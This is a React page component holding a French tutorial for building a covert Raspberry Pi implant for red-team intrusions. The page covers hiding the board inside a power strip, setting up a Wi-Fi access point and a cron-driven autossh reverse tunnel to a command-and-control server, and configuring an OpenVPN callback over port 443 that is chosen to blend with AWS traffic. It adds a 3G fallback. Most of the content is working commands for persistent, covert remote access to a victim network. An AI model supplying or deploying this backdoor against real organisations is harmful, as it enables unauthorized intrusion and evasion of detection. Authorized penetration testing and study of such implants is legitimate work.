import React from 'react';
import HackThePlanet from "../img/hacktheplanet.gif"
import Hide from "../img/hide_raspberry.jpg"
import Methodo from "../img/methodo.jpg"
import KaliRaspberry from "../img/kali_raspberry.png"
import Raspap from "../img/raspap_01.png"
import InstanceVPS from "../img/instanceVPS.PNG"
import FirewallRules from "../img/regles_firewall.PNG"
import AutologinProfile from "../img/autologin_profil.png"
import RedteamUser from "../img/user_redteam.PNG"
import PublicIP from "../img/ip_publique.PNG"

class Redteam extends React.Component {
    render() {
      return (
      <div className="article">

        <h1>Redteam</h1>
   
        <hr/>
        <p className="tabulation">Une nouvelle tendance émerge du côté des attaques informatiques, les techniques d’intrusion se professionnalisent, s’industrialisent et s’étendent dans le temps. Là où des « amateurs » n’avaient qu’à exécuter un script sur un système vulnérable autrefois, des équipes expérimentées peuvent aujourd’hui passer des mois sur une seule et même cible, <strong>APT (Advanced Persitent Threat).</strong></p>

        <p className="tabulation">Pour s'adapter les entreprises de sécurité propose depuis peu une nouvelle approche dans la réalisation d’un test d’intrusion : le <strong>RedTeam</strong>. <br/><br/>L’objectif est de dérouler un scénario complet d'attaque depuis l'externe jusqu’à l'interne et la capacité d'effectuer des actions critiques au sein du SI ciblé. Par rapport à un pentest traditionnel la durée est généralement plus longue et les moyens, plus variés (ex: phishing des employés, intrusions physiques dans les locaux).</p>

        <img id="hacktheplanet" src={HackThePlanet} alt="hack the planet"></img>

        <br/>
        <hr/>
        <br/>

        <h2>Contexte</h2>
        <p className="tabulation">Notre projet consiste à créer un implant qu'il suffira de déposer chez un client pour avoir un accès à distance au réseau interne. Cela représente la phase de compromission initiale dans le schéma suivant: <br/>

        <img id="methodoredteam" src={Methodo} alt="méthodologie redteam"/>
        <br/>  

        Le scénario de la mission sera de pénétrer physiquement dans la société et d'y dissimuler notre backdoor pour obtenir un accès à distance via une connexion OpenVPN ou un tunnel SSH inversé.<br/><br/>  

        Des outils tels que la <strong>LAN Turtle</strong> existent déjà mais l'on souhaite avoir le contrôle total de nos outils. <br/><br/>
        
        Plusieurs méthodes se doivent d'être implémentées au cas où des règles de pare-feu bloqueraient certains flux sortants et une méthode alternative de connexion via Wifi ou GSM est également à envisager.
        </p>

        <br/>
        <hr/>
        <br/>

        <h2>Cahier des charges de la box</h2>
        <div>
        Plusieurs appareils peuvent convenir, les critères principaux étant sa fiabilité, sa légèreté, sa taille, sa rapidité et son coût:
            <ul>
                <li>l'appareil doit être <strong>petit</strong> (facile à dissimuler)</li>
                <li>possibilité d'utiliser un <strong>tunnel SSH inverse persistant</strong> et <strong>OpenVPN</strong></li>
                <li>espace de <strong>stockage</strong> (au moins 32 Go)</li>
                <li>matériel <strong>rapide</strong></li>
                <li><strong>faible coût</strong> (en cas de destruction ou de vol)</li>
                <li>possibilité d'ajouter des modules éventuels</li>
            </ul>
        Il existe de nombreux appareils comme le Hardkernel ODROID-N2 ou encore le Beaglebone Black mais au vu du prix, de la simplicité, et des autres critères, on préférera utiliser une <strong>Raspberry Pi.</strong></div>

        <img id="kaliraspberry" src={KaliRaspberry} alt="kali raspberry"/>

        <h2>Shopping list pour le matériel</h2>
        <div>
          <ul>
            <li><a href="https://www.canakit.com/raspberry-pi-4-starter-kit.html">Raspberry Pi 4 Model B with 4GB RAM (Basic Kit) - $100</a></li>
            <li><a href="https://www.amazon.com/dp/B07FCMBLV6">SanDisk 64GB Extreme microSDXC UHS-I Memory Card - $15</a></li>
            <li><a href="https://vilros.com/collections/raspberry-pi-accessories/products/vilros-raspberry-pi-4-compatible-clear-transparent-case-with-built-in-fan">Raspberry Pi 4 Case with Fan - $10 (optional)</a></li>
            <li><a href="https://www.amazon.com/gp/product/B01KWQAQ00/ref=ppx_yo_dt_b_asin_title_o00_s00?ie=UTF8&psc=1">Wireless WiFi USB Dongle Stick Adapter RT5370 150Mbps - $9 (optional)</a></li>
          </ul>
        </div>

        <br/>

        <h2>Système d'exploitation</h2>
        <p className="tabulation">On retiendra la distribution <strong>Kali Linux</strong> car elle dispose déjà d'outils de pentest intégrés, pas besoin d'installation et c'est simple à utiliser pour tous pentesters.</p>
        
        <br/>

        <h2>Wifi</h2>
        <p className="tabulation">La Raspberry Pi 4 dispose déjà d'une carte sans fil intégrée (sans fil 2,4 GHz et 5,0 GHz IEEE 802.11ac), et gère l'<strong>injection de paquets</strong> et <strong>le mode moniteur</strong> (contrairement à la Pi 3). Un autre adaptateur sans fil permettrait d'avoir une meilleure portée lors d'attaques sans fil.

        Un adaptateur sans fil doté d'un <strong>chipset RT5370</strong> serait un bon choix, en plus de prendre en charge le mode moniteur, et l'injection de paquets avec des outils comme <strong>Aireplay-ng</strong>, il a une large bande de fréquences utilisables. Ainsi on peut se connecter à un adaptateur via <strong>hostapd</strong>et utiliser l'autre adaptateur afin de réaliser les attaques.</p>
        
        <br/>

        <h2>Comment dissimuler la Raspberry ?</h2>
        <p>Une méthode efficace est de la cacher à l'intérieur d'une multiprise comme suit :</p>
        <img id="hide_raspberry" src={Hide} alt="idée pour chacher raspberry"/>

        <p>Cet objet du quotidien dans une entreprise a l'avantage de fournir l'alimentation et le câble réseau à la carte sans éveiller trop de soupçons de la part des employés</p>
        
        <br/>
        <hr/>
        <br/>

        <h2>Configuration initiale</h2>
        <div>
          <ol>
            <li>Installer l'image Kali pour la carte MicroSD</li>
            <li>Configurer un point d'accès WiFi</li>
            <li>Configurer un tunnel SSH inverse automatique</li>
            <li>Configurer le client et le serveur OpenVPN</li>
          </ol>
        </div>
        <h3>Installation de Kali Linux</h3>
        <a href="https://www.offensive-security.com/kali-linux-arm-images/#1493408272250-e17e9049-9ce8">Kali Linux</a>

        <br/>
        <br/>

        <div>
          <h4>Pour Windows</h4>
          Connectez la carte MicroSD à la machine Windows. <br/>
          Décompressez l'archive.<br/>
          Utilisez Win32DiskImager ou Rufus pour écrire l'image disque Kali sur la carte MicroSD.<br/>

          <br/> 

          <h4>Pour Linux</h4>
          Connectez la carte MicroSD au système Linux.<br/>
          Utilisez la commande <strong>dd</strong> pour créer l'image du fichier Kali sur la carte MicroSD.<br/>

          <br/>

          <h4>Installation</h4>
          Alimentez la Raspberry, connectez clavier/souris/écran et connectez-vous à Kali Linux avec le nom d'utilisateur "root" et le mot de passe "toor".<br/>
          Veillez à connecter un câble Ethernet sur la Raspberry pour l'accès internet elle devrait alors récupérer automatiquement une adresse IP via DHCP.
          
        </div>

        <br/>
        <hr/>
        <br/>
        
        <h3>Configurer un point d'accès Wifi</h3>

        <p>On va utiliser l'outil <strong>raspAP</strong> pour mettre en place un point d'accès Wifi sur notre Raspberry :</p>

        <div id="terminal">yes | curl -sL https://install.raspap.com | bash</div>

        <p>Après le reboot, raspAP a mis en place toute la configuration de l'Access Point (AP) !<br/><br/>

        Le <strong>DHCP</strong> distribue des adresses entre 10.3.141.50 et 10.3.141.255. Ainsi lorsqu’un appareil (PC, smartphone, tablette...) se connectera sur ce Wifi, une adresse IP comprise entre ces deux valeurs lui sera fournie.<br/><br/>

        On accède à l’interface d’administration via une page web, en se connectant sur l’adresse IP : 10.3.141.1. On peut le faire en local sur la Raspberry Pi/AP ou depuis une autre machine connectée à l’AP.<br/><br/>

        Les paramètres par défaut sont :</p>
        <ul>
          <li>Adresse IP : 10.3.141.1/24  et  169.254.218.244/16</li>
          <li>Nom d’utilisateur : admin</li>
          <li>Mot de passe : secret</li>
          <li>Plage DHCP : 10.3.141.50-255</li>
          <li>SSID : raspi-webgui</li>
          <li>Mot de passe du SSID : ChangeMe</li>
        </ul>

        <img id="raspap" src={Raspap} alt="raspap_AP"/>

        {/* Installation manuelle (sans raspap)
        <div id="terminal">apt-get install hostapd <br/>
        apt-get install pciutils<br/>

        nano /etc/network/interfaces<br/><br/>
        ##Le fichier /etc/network/interfaces devrait ressembler à:<br/>

        auto lo<br/>
        iface lo inet loopback<br/>
        auto eth0<br/>
        iface eth0 inet dhcp<br/>
        auto wlan0<br/>
        allow-hotplug wlan0<br/>
        iface wlan0 inet static<br/>
        address 172.16.66.1<br/>
        netmask 255.255.255.0<br/>
        gateway 172.16.66.1<br/>
        
        <br/>

        ##Install a DHCP server that will serve WiFi clients:<br/><br/>

        apt-get install udhcpd<br/>

        nano /etc/udhcpd.conf<br/><br/>
        ##Add the following to the end of the file:<br/><br/>

        start           172.16.66.50<br/>
        end             172.16.66.70<br/>
        interface       wlan0<br/>
        # Optional<br/>
        opt     dns     1.1.1.1<br/>
        option  subnet  255.255.255.0<br/>
        opt     router  172.16.66.1<br/>
        option  domain  local<br/>
        <br/>
        ##Create a file for udhcpd.leases:<br/><br/>

        touch /var/lib/misc/udhcpd.leases<br/>
        ##Edit the /etc/default/udhcpd file <br/>and change the DHCPD_ENABLED=”no” to “yes”:<br/><br/>

        DHCPD_ENABLED=”yes”<br/>
        ##Create the file /etc/hostapd/hostapd.conf<br/><br/>

        nano /etc/hostapd/hostapd.conf<br/>
        ##Copy the following into the hostapd.conf file :<br/><br/>

        # Interface configuration<br/>
        interface=wlan0<br/>
        ssid=iphone10<br/>
        channel=6<br/><br/>

        # WPA Configuration<br/>
        macaddr_acl=0<br/>
        auth_algs=1<br/>
        ignore_broadcast_ssid=0<br/>
        wpa=2<br/>
        wpa_passphrase=SuperSecretSquirrel<br/>
        wpa_key_mgmt=WPA-PSK<br/>
        rsn_pairwise=CCMP<br/>

        #Hardware Configuration<br/>
        driver=nl80211<br/>
        ieee80211n=1<br/>
        hw_mode=g<br/>
        wmm_enabled=1<br/><br/>


        nano /etc/init.d/hostapd<br/>
        ##Change the line to the following:<br/><br/>

        DAEMON_CONF=/etc/hostapd/hostapd.conf<br/><br/>

        nano /etc/default/hostapd<br/>
        ##Change the line to the following:<br/><br/>

        DAEMON_CONF="/etc/hostapd/hostapd.conf"

        update-rc.d hostapd enable
        ##Now, we need to enable IP forwarding in the kernel for forwarding packets for our client devices to the Internet:<br/><br/>

        sysctl -w net.ipv4.ip_forward=1<br/><br/>

        nano /etc/sysctl.conf<br/>
        [Remove the “#” in front of net.ipv4.ip_forward=1]<br/><br/>

        Finally, use your IPTables-magic to masquerade client connections to the Internet:<br/><br/>

        iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE<br/>
        There is a package available in Kali to make these changes to IPTables last.<br/><br/>

        apt-get install iptables-persistent<br/>
        iptables-save > /etc/iptables/rules.v4<br/><br/>
        ##To ensure the iptables rules get loaded before the network interface at boot, we will create a short script in the /etc/network/if-pre-up.d/ directory:<br/><br/>

        nano /etc/network/if-pre-up.d/iptables<br/>
        Add the following code to the above /etc/network/if-pre-up.d/iptables file, then save:<br/><br/>

        #!/bin/bash<br/>
        /usr/sbin/iptables-restore {'<'} /etc/iptables/rules.v4<br/><br/>

        chmod +x /etc/network/if-pre-up.d/iptables<br/>

        reboot<br/>
        ##You should now see a wireless network named “iphone10” (or whatever named you use)<br/> where you can connect to it with your wpa_passphrase you set earlier. You<br/> should also have Internet too assuming your Raspberry Pi 4 has Internet. Once<br/> connected, you can also SSH into your Raspberry Pi 4.
        </div> */}


        <br/>
        <hr/>
        <br/>

        <h3>Configurer un reverse shell automatique</h3>
        <p>Pour cette partie on doit disposer d'un serveur de commande et de contrôle (C{"&"}C) accessible sur Internet avec SSH d'activé. Pour le POC j'ai pour le moment utilisé mon serveur perso ^^ <br/><strong>[Sur la Raspberry]</strong></p>   

        <div id="terminal">
        apt install autossh <br/>
        ssh-keygen (laisser les paramètres par défaut) 
        </div>

        <div id="terminal">scp /root/.ssh/id_rsa.pub root@[Server IP_Address]:~/.ssh/</div>

        <strong>[Sur le serveur]</strong><br/>
        Ajouter le contenu id_rsa.pub à ~/.ssh/authorized_keys ou bien créer ce fichier:<br/>

        <div id="terminal">cat id_rsa.pub >> ~/.ssh/authorized_keys</div>

        <p><strong>[Sur la Raspberry]</strong><br/>
        On va créer une crontab qui exécute autossh après chaque boot et est relancée toutes les 5 min (en cas de coupure de connexion)</p>

        <div id="terminal">
        vim /bin/autossh-connect.sh<br/>

        #!/bin/bash<br/>
        autossh -M 11166 -N -f -o “PubkeyAuthentication=yes” -o “PasswordAuthentication=no” <br/>-i /root/.ssh/id_rsa -R 6667:localhost:22 root@[Server IP] {"&"}</div>

        -N: n'exécute pas de cmd sur la machine intermédiaire<br/>
        -f: lancé en tache de fond<br/>
        <br/>
        <div id="terminal">chmod u+rwx,g+xr,o+x autossh-connect.sh</div>

        <div id="terminal">
        crontab -e<br/>
        
        #Ajouter à la fin du fichier : <br/>

        @reboot sleep 5 {"&&"} /bin/autossh-connect.sh > /dev/null 2>{"&"}1<br/>
        */5 * * * * /bin/autossh-connect.sh > /dev/null 2>{"&"}1<br/>
        </div>
        
        <p>Voilà, à présent la RaspBerry va se connecter à chaque boot à notre serveur de commande et contrôle</p>
        <p>Exécutez la commande suivante sur le serveur pour obtenir le reverse shell :</p>

        <div id="terminal">ssh root@localhost -p 6667 (credentials par défaut de Kali)</div>      
        
        <br/>
        <hr/>
        <br/>

        <h3>Configurer une connexion OpenVPN</h3>
        <p className="tabulation">Une garantie d'accès en plus du reverse SSH serait d'utiliser une connexion OpenVPN sur le port 443 (HTTPS). La Raspberry devra d'abord sortir par le port 443 vers un serveur OpenVPN Access Server en notre possession et il suffira de se connecter depuis la machine d'attaque au serveur VPN.
        </p>

        <u>Cela se fait en 3 étapes :</u>

        <ul>
          <li>Configuration d'OpenVPN Access Server sur le net</li>
          <li>Configuration de la Raspberry</li>
          <li>Configuration de la machine d'attaque</li>
        </ul>

        <br/>

        <h3>Mise en place OpenVPN Access Server</h3>
        <p className="tabulation">Pour la solution d'hébergement du serveur VPN on peut opter pour un serveur VPS car ils sont faciles et rapides à mettre en place.<br/><br/>

        <strong>Vultr.com</strong> et <strong>Amazon Lightsail</strong> sont deux fournisseurs de VPS bon marché et simples à configurer. L'autre raison de ce choix est que le réseau de la victime aura souvent beaucoup de trafic vers les serveurs AWS, cela permet donc d'être plus discret dans le réseau. Pour le POC je me suis crée un VPS perso sur Amazon.
        </p>
      
        <ol>
          <li>Allez sur <a href="https://aws.amazon.com/lightsail/">Lien VPS amazon</a>, se connecter puis créer une nouvelle instance de VPS (OS Ubuntu)</li>

          <img id="instance" src={InstanceVPS} alt="instance VPS"/>

          Une fois crée, Manage -> Networking, ajoutez 2 règles firewall sur les ports (443 et 943)

          <img id="firewall" src={FirewallRules} alt="règle firewall"/>

          <li>Installez OpenVPN AS</li>
          <p id="terminal" style={{'text-align':'left'}}>
            # apt update {"&&"} apt -y install ca-certificates wget net-tools <br/>
            # wget -qO - https://as-repository.openvpn.net/as-repo-public.gpg | apt-key add - <br/>
            # echo "deb http://as-repository.openvpn.net/as/debian bionic main" > /etc/apt/sources.list.d/openvpn-as-repo.list <br/>
            # apt update {"&&"} apt -y install openvpn-as <br/>
          </p>

          <li>Supprimez le profil actuel et configurez OpenVPN:  <strong>/usr/local/openvpn_as/bin/ovpn-init</strong></li>
          <li>Tapez DELETE: (sensible à la casse)</li>
          <li>Finir l'installation comme suit :</li>
        </ol>
        <p id="terminal">Accept EULA: yes <br/>
          Will this be the primary Access Server node: yes <br/>
          Please specify the network interface and IP address to be <br/>
          used by the Admin Web UI: <br/>
          (1) all interfaces: 0.0.0.0 <br/>
          (2) eth0: 45.77.217.54 <br/>
          Réponse: 1 <br/>
          Please specify the port number for the Admin Web UI. <br/>
          Réponse: 943 <br/>
          Please specify the TCP port number for the OpenVPN Daemon <br/>
          Réponse: 443 <br/>
          Should client traffic be routed by default through the VPN? <br/>
          Réponse: YES <br/>
          Should client DNS traffic be routed by default through the VPN? <br/>
          Réponse: YES <br/>
          Use local authentication via internal DB? <br/>
          Pour la suite sélectionnez les réponses par défaut (tapez juste 'Enter') <br/>
          </p>

          <p>passwd openvpn <br/>
          Changez le mot de passe pour l'utilisateur openvpn.</p>
    
          <br/>

          <h3>Configuration de OpenVPN AS Server</h3>
          <ol>
            <li>Allez sur https://[IP_Serveur_VPS]:943/admin/</li>
            <li>Se connecter avec le compte <strong>openvpn</strong> et le mot de passe précédemment crée.</li>
            <li>Authentication -> General -> Set to Local (ON) -> Save Settings -> Update Server</li>
            <li>User Management -> User Permissions, créez l'utilisateur <strong>redteam</strong> avec <strong>Set AllowAuto-login</strong></li>
            <li>-> More settings, activez les autorisations : <br/>
            <strong>All server-side private subnets</strong><br/>
            <strong>All other VPN clients</strong></li>
            <li>-> Network settings, indiquer l'adresse publique du VPS</li>
          </ol>

          <img id="publique" src={PublicIP} alt="modification ip publique"/>

          <h3>Télécharger les profils OpenVPN</h3>
          <ol>
            <li>Se connecter sur https://[IP_VPS]:943/?src=connect</li>
            <li>Pour chaque utilisateur se connecter et télécharger le profil <strong>Yourself (autologin profile)</strong></li>
          </ol>

          <img id="autologin" src={AutologinProfile} alt="autologin profile"/>

          <h3>Configuration de la Raspberry Pi</h3>
          <li>Allumez la Raspberry et branchez un câble ethernet</li>
          <li>Configurez le démarrage automatique d'OpenVPN : <strong>vim /etc/default/openvpn</strong> <br/> et décommentez <strong>[‘AUTOSTART=”all”’]</strong></li>
          <li>Copiez <strong>client.ovpn</strong> sur la Raspberry dans <strong>/etc/openvpn/</strong></li>
          <li>Renommez le en <strong>client.conf</strong></li>
          <li>Activez OpenVPN pour démarrer au boot: <strong>update-rc.d openvpn enable</strong></li>
          <li>Reboot</li>
          
          <br/>

          <p className="tabulation">Sur OpenVPN AS, Connexions -> Utilisateurs actuels, on voit apparaître l'utilisateur <strong>redteam</strong> avec l'adresse réelle de l'endroit où la Raspberry est branchée et une adresse VPN.</p>

          <img id="redteamuser" src={RedteamUser} alt="connexion utilisateur redteam"/>
          
          <p className="tabulation"> Nous avons à présent la Raspberry configurée pour se reconnecter au serveur OpenVPN de notre serveur VPS dès qu'elle est connectée à un réseau.</p>

          <img src="https://media.giphy.com/media/x2z9nswqAfpp6/giphy.gif" alt="yatta"/>

          <p>Pour avoir un accès à la Raspberry il suffit d'utiliser le même profil vpn à partir de notre VM d'attaque et d'utiliser ssh sur l'adresse IP privée du dessus :</p>

          <div id="terminal">
            # openvpn --config ./client.ovpn <br/>
            # ssh root@172.27.224.2
          </div>

          <br/>
          <hr/>
          <br/>

          <h3>Configuration GSM</h3>
          <p>Lien pour dongle : <a href="http://shop.mchobby.be/product.php?id_product=677">dongle GSM (23,60€)</a>    (module 3G HSDPA, support SMS et connexion internet)</p>

          <p className="tabulation">Ce module permet d'établir des connexions Internet via le réseau 3G et d'obtenir une connexion là où vous ne disposez pas d'ADSL, de ligne téléphonique classique ou de WiFi.</p>

          
          <ul>
            <li>Editez le fichier <strong>config.txt</strong> dans le dossier <strong>/boot/</strong></li>
            <li>Ajoutez la ligne suivante: <strong>max_usb_current=1</strong></li>
            <li>Après reboot, branchez la clef USB à la Raspberry</li>
          </ul>


          <p>La commande <strong>lsusb</strong> devrait la faire apparaître dans la liste. Sinon vérifiez le matériel et la connectique.</p>
          
          <div id="terminal">
            $ sudo apt-get update<br/>
            $ sudo apt-get install ppp wvdial<br/>
          </div>

          <h4>Configuration de wvdial</h4>

          <p>Le fichier de configuration <strong>/etc/wvdial.conf</strong> :</p>

          <div id="terminal">
          [Dialer Defaults]<br/>
          Init1 = ATZ<br/>
          Init2 = ATQ0 V1 E1 S0=0 {"&"}C1 {"&"}D2<br/>
          Init3 = AT+CGDCONT=1,"IP","web.be"<br/>
          Stupid Mode = 1<br/>
          Modem Type = Analog Modem<br/>
          ISDN = 0<br/>
          New PPPD = yes<br/>
          Phone = *99#<br/>
          Modem = /dev/ttyUSB0<br/>
          Username = web<br/>
          Password = web<br/>
          Baud = 9600
          </div>

          <p>Les paramètres <strong>web.be</strong> sont des paramètres propres aux opérateurs 3G :<br/><br/>

          <strong>Pour Mobistar (Orange Belgique)</strong><br/>
          Remplacez web.be par <strong>mworld.be</strong>, (business: entrez web.pro.be)<br/>
          ' Username = '' et ' Password = ''<br/><br/>

          <strong>Pour Proximus</strong><br/>
          Remplacez web.be par <strong>internet.proximus.be</strong><br/>
          ' Username = '' et ' Password = ''<br/><br/>

          <strong>Pour Base</strong><br/>
          Remplacez web.be par <strong>gprs.base.be</strong><br/>
          ' Username = 'base' et ' Password = 'base'
          </p>

          <p className="tabulation">Une fois wvdial configuré, <strong>sudo wvdial</strong> afin de lancer la connexion 3G. Plusieurs informations vont défiler à l'écran dont l'adresse IP publique et les DNS fournis par le FAI. CTRL+C pour couper la connexion, cela affichera alors la durée pendant laquelle la connexion a été maintenue.</p>
      </div>
      );
    }
  }

  export default Redteam;  